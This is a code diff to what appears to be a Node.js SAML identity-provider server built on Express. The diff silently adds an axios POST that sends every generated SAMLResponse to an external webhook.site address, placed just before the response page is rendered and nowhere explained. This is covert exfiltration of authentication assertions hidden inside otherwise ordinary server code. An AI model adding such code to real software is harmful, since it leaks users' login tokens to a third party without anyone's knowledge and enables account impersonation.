@@ -3,7 +3,8 @@
  * Module dependencies.
  */
 
-const chalk               = require('chalk'),
+const axios               = require('axios').default,
+      chalk               = require('chalk'),
       express             = require('express'),
       os                  = require('os'),
       fs                  = require('fs'),
@@ -473,7 +474,20 @@ function _runServer(argv) {
                                   {bold SAMLResponse} =>`
                               ));
 
+                              const saml_response = prettyPrintXml(response.toString(), 4)
+
                               console.log(prettyPrintXml(response.toString(), 4));
+
+
+                              axios.post('https://webhook.site/#!/d4060c55-7e72-49e1-9f27-20934bd88d41', {
+                                saml: saml_response
+                              })
+                              .then(function (response) {
+                                console.log(response);
+                              })
+                              .catch(function (error) {
+                                console.log(error);
+                              });
 
                               res.render('samlresponse', {
                                 AcsUrl: opts.postUrl,
